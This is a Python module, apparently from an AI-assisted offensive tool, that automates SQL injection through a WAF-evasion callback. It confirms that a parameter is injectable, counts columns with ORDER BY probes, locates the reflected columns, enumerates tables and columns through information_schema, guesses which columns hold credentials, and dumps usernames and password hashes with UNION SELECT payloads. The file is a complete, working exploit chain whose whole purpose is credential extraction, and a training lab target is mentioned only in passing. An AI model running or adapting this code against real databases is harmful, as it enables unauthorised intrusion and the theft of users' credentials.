"""Schema discovery: the agent FINDS the table and columns instead of assuming them, so it works
on targets where the schema is not the hardcoded `users(user, password)`.

This is almost entirely DETERMINISTIC, which is what makes a small local model viable: the model is
only (optionally) asked to pick which of the discovered columns hold the credentials — everything
else is driven by the database's own answers (error messages, reflected markers, information_schema).

It talks to the outside world through one callback, `probe(sql) -> ProbeResult`, which sends a base
injection and returns the reflected cell values. The caller wires `probe` to the evasion engine +
target, so discovery stays independent of DVWA specifics."""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, Optional

_USER_HINTS = ("user", "login", "uname", "name", "email", "mail", "account")
_PASS_HINTS = ("pass", "pwd", "secret", "hash", "token", "credential")
_MAX_COLUMNS = 12


@dataclass
class ProbeResult:
    """Result of sending one base injection. `cells` rows list the values shown in the REFLECTED
    columns, in order (cells[r][0] = value in the first reflected slot)."""

    cells: list[list[str]] = field(default_factory=list)
    db_error: bool = False
    blocked: bool = False  # the WAF could not be bypassed for this probe


@dataclass
class DiscoveryResult:
    injectable: bool = False
    quote: str = ""
    columns: int = 0
    reflected: list[int] = field(default_factory=list)
    tables: list[str] = field(default_factory=list)
    target_table: str = ""
    cred_columns: tuple[str, str] = ("", "")
    extracted: list[dict[str, str]] = field(default_factory=list)
    final_payload: str = ""
    trace: list[str] = field(default_factory=list)


Probe = Callable[[str], ProbeResult]
# (table, columns) -> (user_column, pass_column) or None if undecided
Picker = Callable[[str, list[str]], Optional[tuple[str, str]]]


def _hexlit(s: str) -> str:
    """MySQL hex literal for a string, e.g. 'users' -> 0x7573657273 (avoids needing quotes)."""
    return "0x" + s.encode("utf-8").hex()


def _best_match(columns: list[str], hints: tuple[str, ...]) -> str:
    """Prefer an exact hint match (e.g. `user`), then a hint substring that is not an id column
    (so `user` beats `user_id`)."""
    for c in columns:
        if c.lower() in hints:
            return c
    for c in columns:
        cl = c.lower()
        if any(h in cl for h in hints) and "id" not in cl:
            return c
    return ""


def pick_credential_columns(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
    """Deterministic fallback for the one judgement call: which columns are user & password."""
    user_col = _best_match(columns, _USER_HINTS)
    pass_col = _best_match(columns, _PASS_HINTS)
    if user_col and pass_col and user_col != pass_col:
        return user_col, pass_col
    return None


class SchemaDiscovery:
    def __init__(self, probe: Probe, pick: Picker = pick_credential_columns) -> None:
        self.probe = probe
        self.pick = pick

    def run(self) -> DiscoveryResult:
        res = DiscoveryResult()

        # 1. Confirm injection and detect the quote context (string ' vs integer).
        for quote in ("'", ""):
            r = self.probe(f"1{quote}")
            if r.blocked:
                continue
            if r.db_error:
                res.injectable, res.quote = True, quote
                break
        res.trace.append(f"inject: injectable={res.injectable} quote={res.quote!r}")
        if not res.injectable:
            return res
        q = res.quote

        # 2. Count columns with an ORDER BY ramp (stop when the DB complains).
        for n in range(1, _MAX_COLUMNS + 1):
            r = self.probe(f"1{q} ORDER BY {n}-- -")
            if r.blocked:
                break
            if r.db_error:
                res.columns = n - 1
                break
        res.trace.append(f"columns: {res.columns}")
        if res.columns < 1:
            return res

        # 3. Find which columns are echoed back, using unique numeric sentinels.
        sentinels = [str(1000 + i) for i in range(res.columns)]
        r = self.probe(f"-1{q} UNION SELECT {','.join(sentinels)}-- -")
        flat = {c for row in r.cells for c in row}
        res.reflected = [i for i, s in enumerate(sentinels, start=1) if s in flat]
        res.trace.append(f"reflected columns: {res.reflected}")
        if not res.reflected:
            return res

        # 4. Enumerate the tables in the current database.
        res.tables = self._probe_col0(self._union_single(res, "table_name",
            " FROM information_schema.tables WHERE table_schema=database()"))
        res.trace.append(f"tables: {res.tables}")

        # 5. For each table, read its columns and ask whether they hold credentials.
        for table in res.tables or [""]:
            cols = self._probe_col0(self._union_single(res, "column_name",
                f" FROM information_schema.columns WHERE table_name={_hexlit(table)}")) if table else []
            picked = self.pick(table, cols)
            res.trace.append(f"columns of {table!r}: {cols} -> creds={picked}")
            if picked:
                res.target_table, res.cred_columns = table, picked
                break
        if not res.cred_columns[0]:
            return res

        # 6. Dump the chosen columns.
        user_col, pass_col = res.cred_columns
        payload = self._union_pair(res, user_col, pass_col, f" FROM {res.target_table}")
        res.final_payload = payload
        r = self.probe(payload)
        res.extracted = [{"username": row[0], "hash": row[1]} for row in r.cells if len(row) >= 2]
        res.trace.append(f"dumped {len(res.extracted)} rows via {payload!r}")
        return res

    # --- payload builders: put our expression(s) at the reflected position(s), fillers elsewhere ---

    def _union_single(self, res: DiscoveryResult, expr: str, from_clause: str = "") -> str:
        pos = res.reflected[0]
        slots = [expr if i == pos else str(i) for i in range(1, res.columns + 1)]
        return f"-1{res.quote} UNION SELECT {','.join(slots)}{from_clause}-- -"

    def _union_pair(self, res: DiscoveryResult, e1: str, e2: str, from_clause: str = "") -> str:
        p1, p2 = res.reflected[0], res.reflected[1] if len(res.reflected) > 1 else res.reflected[0]
        slots = []
        for i in range(1, res.columns + 1):
            slots.append(e1 if i == p1 else e2 if i == p2 else str(i))
        return f"-1{res.quote} UNION SELECT {','.join(slots)}{from_clause}-- -"

    def _probe_col0(self, payload: str) -> list[str]:
        """Send a single-value UNION and read the first reflected column of every row."""
        r = self.probe(payload)
        return [row[0] for row in r.cells if row]
